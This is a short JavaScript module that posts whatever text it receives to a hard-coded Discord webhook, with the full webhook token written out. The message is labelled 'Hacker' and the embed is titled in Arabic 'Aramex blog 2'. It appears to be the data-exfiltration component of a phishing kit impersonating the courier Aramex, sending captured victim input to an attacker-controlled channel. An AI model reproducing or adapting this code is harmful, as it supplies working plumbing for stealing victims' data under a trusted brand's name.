import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328356197606359080/l4AMe8gvJ5oBY2sbs-Zw65XIXa9ZCf0LlvBAXRceBidSyQ8JdXEWuY6HZkJQ1CF69lw2",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
